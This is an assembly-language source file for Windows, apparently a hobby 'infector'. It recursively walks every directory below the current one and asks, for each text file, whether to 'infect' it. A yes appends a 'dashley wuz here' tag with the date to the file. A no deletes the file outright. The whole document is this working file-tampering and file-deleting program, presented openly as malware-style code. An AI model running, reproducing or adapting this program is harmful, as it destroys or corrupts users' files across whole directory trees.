include C:\masm32\include\masm32rt.inc

.data

	currentdirectory db 260 DUP(0) ; :::WARNING::: UNIDENTIFIED BEHAVIOR IF FILE PATH EXCEEDS MAX_PATH
	currentmaskTXT db 260 DUP (0)
	currentmaskALL db 260 DUP (0)

	crlf db 0dh, 0ah, 0
	
	writeme db 0dh, 0ah, "dashley wuz here - " ; the order of declaration of these two memory blocks is important
	timenow db "2000-00-00",0 ; previous string is designed to overflow into this one
	
	infectmsg db "Do you want to infect this file?", 0
	infecttitle db "Infection query", 0
	
	filetowork db 260 DUP(0)
	
.data?
	foundfile WIN32_FIND_DATA<>
	systime SYSTEMTIME <>
	written dd ?
	
.code

refreshtime proc ;records time and stores in timenow

	push offset systime
	call GetLocalTime
	
	xor eax, eax
	mov ax, systime.wYear
	push offset timenow
	push eax
	call dwtoa
	
	mov BYTE PTR [timenow+4], "-" ; this is necessary because dwtoa appends a null terminator
	
	xor eax, eax
	mov ax, systime.wMonth
	
	cmp ax, 9
	jg highmonth
	push offset timenow+6
	push eax
	call dwtoa
	jmp donemonth
	highmonth:
		push offset timenow+5
		push eax
		call dwtoa
	donemonth:
	
	mov BYTE PTR [timenow+7], "-"
	
	xor eax, eax
	mov ax, systime.wDay
	cmp ax, 9
	jg highday
	push offset timenow+9
	push eax
	call dwtoa
	jmp doneday
	highday:
		push offset timenow+8
		push eax
		call dwtoa
	doneday:
	ret

refreshtime endp

loadpath proc ; takes the path of the worked directory and appends filename for usable string
	lea edx, [filetowork]
	blankingFILE:
	mov al, [edx]
	cmp al, 0
	je doneblankingFILE
	mov BYTE PTR[edx], 0
	inc edx
	jmp blankingFILE
	doneblankingFILE:
	
	lea ecx,[currentdirectory]
	
	lea edx, [filetowork]
	copyingFILE:
	mov al, [ecx]
	mov BYTE PTR [edx], al
	cmp al, 0
	je donecopyingFILE
	inc ecx
	inc edx
	jmp copyingFILE
	donecopyingFILE:
	mov BYTE PTR [edx], "\"
	inc edx
	
	lea ecx, [foundfile.cFileName]
	appendingFILE:
	mov al, [ecx]
	mov BYTE PTR [edx], al
	cmp al, 0
	je doneappendingFILE
	inc ecx
	inc edx
	jmp appendingFILE
	doneappendingFILE:
	ret
loadpath endp

appendsig proc ; appends signature to file described by filetowork 
	push 0
	push FILE_ATTRIBUTE_NORMAL
	push OPEN_EXISTING
	push 0
	push 0
	push GENERIC_WRITE
	push offset filetowork
	call CreateFileA
		
	push eax
	
	push FILE_END
	push 0
	push 0
	push eax
	call SetFilePointer
	
	pop eax
	push 0
	push offset written
	push 31
	push offset writeme
	push eax
	call WriteFile
	
	ret
appendsig endp

getFiles proc ;recursive proc to go through directory
;---------------------------------------- Blank out and initialize search masks
	lea edx, [currentmaskALL]
	blankingALL:
	mov al, [edx]
	cmp al, 0
	je doneblankingALL
	mov BYTE PTR[edx], 0
	inc edx
	jmp blankingALL
	doneblankingALL:
	
	lea edx, [currentmaskTXT]
	blankingTXT:
	mov al, [edx]
	cmp al, 0
	je doneblankingTXT
	mov BYTE PTR[edx], 0
	inc edx
	jmp blankingTXT
	doneblankingTXT:
	
;---------------------------------------- Make search masks from currentdirectory	
	lea ecx,[currentdirectory]
	
	lea edx, [currentmaskALL]
	copyingALL:
	mov al, [ecx]
	mov BYTE PTR [edx], al
	cmp al, 0
	je donecopyingALL
	inc ecx
	inc edx
	jmp copyingALL
	donecopyingALL:
	mov BYTE PTR [edx], "\"
	inc edx
	mov BYTE PTR [edx], "*"

	
	lea ecx,[currentdirectory]
	
	lea edx, [currentmaskTXT]
	copyingTXT:
	mov al, [ecx]
	mov BYTE PTR [edx], al
	cmp al, 0
	je donecopyingTXT
	inc ecx
	inc edx
	jmp copyingTXT
	donecopyingTXT:
	mov BYTE PTR [edx], "\"
	inc edx
	mov BYTE PTR [edx], "*"
	inc edx
	mov BYTE PTR [edx], "."
	inc edx
	mov BYTE PTR [edx], "t"
	inc edx
	mov BYTE PTR [edx], "x"
	inc edx
	mov BYTE PTR [edx], "t"

;---------------------------------------- Find all text files
	
	push offset foundfile
	push offset currentmaskTXT
	call FindFirstFileA 	
	push eax
	
	cmp eax, INVALID_HANDLE_VALUE
	je nothinghere
	
	; --------------------------------FIRST FILE FOUND PUT FILE OPS HERE
	call loadpath
	
	push offset filetowork
	call StdOut
	push offset crlf
	call StdOut
	
	push MB_YESNO
	push offset infecttitle
	push offset infectmsg
	push 0
	call MessageBoxA
	
	cmp eax, IDYES
	je doappend1
	
	push offset filetowork
	call DeleteFileA
	jmp done1
	
	doappend1:
	call appendsig
	done1:
	
	
	;------------------------------------- End of working with first file
;------------------------------------------- find next text files
	printerrythang:
	pop eax
	push eax
	push offset foundfile
	push eax
	call FindNextFileA
	
	cmp eax, 0
	je nothinghere
	
	;------------------------------------------ 2nd and onwards txt files here
	
	call loadpath
	
	push offset filetowork
	call StdOut
	push offset crlf
	call StdOut
	
	push MB_YESNO
	push offset infecttitle
	push offset infectmsg
	push 0
	call MessageBoxA
	
	cmp eax, IDYES
	je doappend2
	
	push offset filetowork
	call DeleteFileA
	jmp done2
	
	doappend2:
	call appendsig
	done2:
	
	
	jmp printerrythang
	
;---------------------------------------------- done finding textfiles
	nothinghere:
	call FindClose
;-----------------------------------------------find all directories

	push offset foundfile
	push offset currentmaskALL
	call FindFirstFileA 	
	push eax
	
	cmp eax, INVALID_HANDLE_VALUE ; skips search for if there are no directories
	je nothinghere2

	mov eax, foundfile.dwFileAttributes ; this is technically uneeded
	and eax, FILE_ATTRIBUTE_DIRECTORY
	jz printerrythang2
	
	;---------------------------------------- first directory found (ignore it because it's ".")

	
	printerrythang2:
	pop eax
	push eax
	push offset foundfile
	push eax
	call FindNextFileA
	
	cmp eax, 0
	je nothinghere2
	
	mov eax, foundfile.dwFileAttributes
	and eax, FILE_ATTRIBUTE_DIRECTORY
	jz printerrythang2
	
	
	cmp BYTE PTR [foundfile.cFileName], "." ;-------ignore directories that start with "."
	je printerrythang2
	;---------------------------------------- second directory found
	
	lea ecx, [currentdirectory] ;find null terminator of currentdirectory
	getlastinner:
	mov al, [ecx]
	cmp al, 0
	je gotlastinner
	inc ecx
	jmp getlastinner
	gotlastinner:
	
	mov BYTE PTR [ecx], "\"
	inc ecx
	
	
	lea edx, foundfile.cFileName
	appendingcurrent:
	mov al, [edx]
	cmp al, 0
	je doneappending
	mov BYTE PTR [ecx], al
	inc ecx
	inc edx
	jmp appendingcurrent
	doneappending:
	
	call getFiles
	

	
	jmp printerrythang2
	
	nothinghere2:
	
	call FindClose; gets rid of no longer needed search handle to allow new search handle to be seen
	
	lea ecx, [currentdirectory] ;return currentdirectory to previous state
	getlast:
	mov al, [ecx]
	cmp al, 0
	je gotlast
	inc ecx
	jmp getlast
	gotlast:
	dec ecx
	mov al, [ecx]
	cmp al, "."
	je doneregressing
	mov BYTE PTR [ecx], 0
	cmp al, "\"
	je doneregressing
	jmp gotlast
	
	doneregressing:
	
	
	ret

getFiles endp

main:
	call refreshtime
	lea ecx, [currentdirectory]
	mov BYTE PTR [ecx], "." ;----------------- initialize currentdirectory as "."
	call getFiles
	ret
end main
